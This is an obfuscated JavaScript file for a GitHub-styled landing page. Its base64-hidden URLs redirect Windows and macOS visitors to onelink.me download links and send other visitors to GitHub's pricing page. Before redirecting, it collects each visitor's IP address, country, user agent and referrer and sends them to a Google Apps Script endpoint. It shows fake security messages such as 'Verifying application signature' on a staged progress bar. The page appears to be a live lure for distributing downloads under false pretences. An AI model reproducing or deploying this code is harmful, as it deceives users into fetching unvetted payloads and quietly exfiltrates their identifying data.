const _0x3f5a = ['windows', 'macos', 'ios', 'android', 'linux', 'other', 'os', 'offername', 'offer', 'offer_name', 'search', 'hash', 'replace', 'platform', 'userAgent', 'iPhone', 'iPad', 'iPod', 'Android', 'Windows NT', 'Macintosh', 'Linux', 'ip', 'country_name', 'country', 'host', 'commitGrid', 'progress', 'percentage', 'status', 'query', 'href', 'log', 'then', 'json'];

(function(_0x4c3d9a, _0x3f5a32) {
    const _0x4ee0b8 = function(_0x5d87a8) {
        while (--_0x5d87a8) {
            _0x4c3d9a['push'](_0x4c3d9a['shift']());
        }
    };
    _0x4ee0b8(++_0x3f5a32);
}(_0x3f5a, 0x1f4));

const _0x4ee0 = function(_0x4c3d9a, _0x3f5a32) {
    _0x4c3d9a = _0x4c3d9a - 0x0;
    let _0x4ee0b8 = _0x3f5a[_0x4c3d9a];
    return _0x4ee0b8;
};

const DEST = {
    'windows': atob('aHR0cHM6Ly9wd2luLm9uZWxpbmsubWUvem1GYy9kdDM4NzY5eg=='),
    'macos': atob('aHR0cHM6Ly9wbWFjb3Mub25lbGluay5tZS9tNXlZL3E1dmJqZ3Zo'),
    'ios': atob('aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc='),
    'android': atob('aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc='),
    'linux': atob('aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc='),
    'other': atob('aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc=')
};

const APP_URL = atob('aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3aXBfVmdQRXVtQlh1V1hfT0VYNmh1SU1IZlBYaWRpd2VIcEhSLWZHVVFJcXBjUi1tQU1BSEMxSkNVVXlKbmUzbjBRL2V4ZWM=');
const REDIRECT_DELAY_MS = 0xc8;

function parseParams(_0x2b8e9f) {
    const _0x1a7d2e = {};
    if (!_0x2b8e9f) return _0x1a7d2e;
    const _0x59a3a4 = _0x2b8e9f['replace'](/^[?#]+/, '');
    if (!_0x59a3a4) return _0x1a7d2e;
    for (const _0x3a87cd of _0x59a3a4['split']('&')) {
        if (!_0x3a87cd) continue;
        const [_0x5e73a0, _0x4c84f5] = _0x3a87cd['split']('=');
        const _0x2e7f4e = decodeURIComponent((_0x5e73a0 || '')['trim']());
        const _0x258a3f = _0x4c84f5 === undefined ? '1' : decodeURIComponent((_0x4c84f5 || '')['trim']());
        if (_0x2e7f4e) _0x1a7d2e[_0x2e7f4e] = _0x258a3f;
    }
    return _0x1a7d2e;
}

function getOffer() {
    const _0x5a3512 = parseParams(location[_0x4ee0('0x1')]);
    const _0x31c9fe = parseParams(location[_0x4ee0('0x2')]);
    return _0x5a3512[_0x4ee0('0x3')] || _0x5a3512[_0x4ee0('0x4')] || _0x5a3512[_0x4ee0('0x5')] || _0x31c9fe[_0x4ee0('0x3')] || _0x31c9fe[_0x4ee0('0x4')] || _0x31c9fe[_0x4ee0('0x5')] || '';
}

function keepQueryAndHash(_0x2fcd05) {
    return _0x2fcd05 + location[_0x4ee0('0x1')] + (location[_0x4ee0('0x2')] || '');
}

function detectOS() {
    const _0x5a84e7 = new URLSearchParams(location[_0x4ee0('0x1')]);
    const _0x3df9d8 = (_0x5a84e7['get'](_0x4ee0('0x6')) || '')['toLowerCase']();
    if ([_0x4ee0('0x7'), _0x4ee0('0x8'), _0x4ee0('0x9'), _0x4ee0('0xa'), _0x4ee0('0xb'), _0x4ee0('0xc')]['includes'](_0x3df9d8)) return _0x3df9d8;
    
    const _0x2c58b2 = navigator['userAgentData'];
    if (_0x2c58b2 && _0x2c58b2[_0x4ee0('0xd')]) {
        const _0x1e30b2 = _0x2c58b2[_0x4ee0('0xd')]['toLowerCase']();
        if (_0x1e30b2['includes'](_0x4ee0('0x7'))) return _0x4ee0('0x7');
        if (_0x1e30b2['includes']('mac')) return _0x4ee0('0x8');
        if (_0x1e30b2['includes'](_0x4ee0('0x9'))) return _0x4ee0('0x9');
        if (_0x1e30b2['includes'](_0x4ee0('0xa'))) return _0x4ee0('0xa');
        if (_0x1e30b2['includes'](_0x4ee0('0xb'))) return _0x4ee0('0xb');
    }
    
    const _0x34d0a8 = navigator[_0x4ee0('0xe')] || '';
    if (new RegExp(_0x4ee0('0xf') + '|' + _0x4ee0('0x10') + '|' + _0x4ee0('0x11'), 'i')['test'](_0x34d0a8)) return _0x4ee0('0x9');
    if (new RegExp(_0x4ee0('0xa'), 'i')['test'](_0x34d0a8)) return _0x4ee0('0xa');
    if (new RegExp(_0x4ee0('0x12'), 'i')['test'](_0x34d0a8)) return _0x4ee0('0x7');
    if (/Macintosh;.*Mac OS X/i['test'](_0x34d0a8)) return _0x4ee0('0x8');
    if (new RegExp(_0x4ee0('0xb'), 'i')['test'](_0x34d0a8)) return _0x4ee0('0xb');
    return _0x4ee0('0xc');
}

async function getIP() {
    try {
        const _0x2b15b8 = await fetch(atob('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc/Zm9ybWF0PWpzb24='), {
            'cache': 'no-store'
        });
        const _0x5c70d4 = await _0x2b15b8[_0x4ee0('0x13')]();
        return _0x5c70d4[_0x4ee0('0x14')] || '';
    } catch (_0x12c8db) {
        return '';
    }
}

async function getGeo(_0x2f8a56) {
    try {
        if (!_0x2f8a56) return {
            'country': '',
            'countryCode': ''
        };
        const _0x3d76a7 = await fetch(`https://ipapi.co/${_0x2f8a56}/json/`, {
            'cache': 'no-store'
        });
        const _0x1b8f2c = await _0x3d76a7[_0x4ee0('0x13')]();
        return {
            'country': _0x1b8f2c[_0x4ee0('0x15')] || '',
            'countryCode': _0x1b8f2c[_0x4ee0('0x16')] || ''
        };
    } catch (_0x44b5a6) {
        return {
            'country': '',
            'countryCode': ''
        };
    }
}

function logRedirect(_0x2b8e4d) {
    try {
        const _0x5a8c52 = {
            'ip': _0x2b8e4d['ip'],
            'country': _0x2b8e4d['country'],
            'countryCode': _0x2b8e4d['countryCode'],
            'userAgent': navigator[_0x4ee0('0xe')],
            'referrer': document['referrer'] || '',
            'buttonId': 'preloaderRedirect',
            'extra': `os=${_0x2b8e4d['os']}; to=${new URL(_0x2b8e4d['targetUrl'])[_0x4ee0('0x17')]()}`,
            'offer': _0x2b8e4d['offer']
        };
        const _0x2fcd05 = new URLSearchParams({
            'p': JSON['stringify'](_0x5a8c52)
        })['toString']();
        new Image(0x1, 0x1)['src'] = APP_URL + '?' + _0x2fcd05 + '&_t=' + Date['now']();
    } catch (_0x1776d2) {}
}

function createCommitGrid() {
    const _0x5a84e7 = document['getElementById'](_0x4ee0('0x18'));
    const _0x3df9d8 = 0x46;
    for (let _0x2c58b2 = 0x0; _0x2c58b2 < _0x3df9d8; _0x2c58b2++) {
        const _0x1e30b2 = document['createElement']('div');
        _0x1e30b2['classList']['add']('commit-cell');
        if (Math['random']() > 0.4) _0x1e30b2['style']['opacity'] = Math['random']() * 0.5 + 0.3;
        _0x5a84e7['appendChild'](_0x1e30b2);
    }
}

function animateProgress(_0x2fcd05, _0x3a87cd, _0x5e73a0) {
    const _0x4c84f5 = document['getElementById'](_0x4ee0('0x19'));
    const _0x2e7f4e = document['getElementById'](_0x4ee0('0x1a'));
    const _0x258a3f = document['getElementById'](_0x4ee0('0x1b'));
    const _0x5a3512 = document['querySelectorAll']('.commit-cell');
    const _0x31c9fe = ['Initializing security protocols', 'Verifying application signature', 'Establishing secure connection', 'Preparing download session', 'Finalizing redirect sequence'];
    let _0x5a84e7 = 0x0;
    let _0x3df9d8 = 0x0;
    const _0x2c58b2 = setInterval(() => {
        _0x5a84e7 += 0x1;
        _0x4c84f5['style']['width'] = `${_0x5a84e7}%`;
        _0x2e7f4e['textContent'] = `${_0x5a84e7}%`;
        if (_0x5a84e7 === 0x14 && _0x3df9d8 === 0x0) {
            _0x258a3f['textContent'] = _0x31c9fe[0x1];
            _0x3df9d8 = 0x1;
        }
        if (_0x5a84e7 === 0x2d && _0x3df9d8 === 0x1) {
            _0x258a3f['textContent'] = _0x31c9fe[0x2];
            _0x3df9d8 = 0x2;
        }
        if (_0x5a84e7 === 0x46 && _0x3df9d8 === 0x2) {
            _0x258a3f['textContent'] = _0x31c9fe[0x3];
            _0x3df9d8 = 0x3;
        }
        if (_0x5a84e7 === 0x5a && _0x3df9d8 === 0x3) {
            _0x258a3f['textContent'] = _0x31c9fe[0x4];
            _0x3df9d8 = 0x4;
        }
        if (_0x5a84e7 % 0x5 === 0x0) {
            const _0x1e30b2 = _0x5a3512[Math['floor'](Math['random']() * _0x5a3512['length'])];
            if (_0x1e30b2) {
                _0x1e30b2['classList']['add']('active');
                setTimeout(() => _0x1e30b2['classList']['remove']('active'), 0x3e8);
            }
        }
        if (_0x5a84e7 >= 0x64) {
            clearInterval(_0x2c58b2);
            setTimeout(() => {
                location[_0x4ee0('0x1c')](_0x2fcd05);
            }, REDIRECT_DELAY_MS);
        }
    }, 0x28);
}

window['addEventListener']('load', async () => {
    createCommitGrid();
    const _0x2b8e4d = detectOS();
    const _0x5a8c52 = getOffer();
    const _0x2f8a56 = DEST[_0x2b8e4d] || DEST[_0x4ee0('0xc')] || location['origin'];
    const _0x3d76a7 = keepQueryAndHash(_0x2f8a56);
    const _0x1b8f2c = await getIP();
    const _0x44b5a6 = await getGeo(_0x1b8f2c);
    logRedirect({
        'os': _0x2b8e4d,
        'offer': _0x5a8c52,
        'targetUrl': _0x3d76a7,
        'ip': _0x1b8f2c,
        'country': _0x44b5a6['country'],
        'countryCode': _0x44b5a6['countryCode']
    });
    animateProgress(_0x3d76a7, _0x2b8e4d, _0x5a8c52);
});
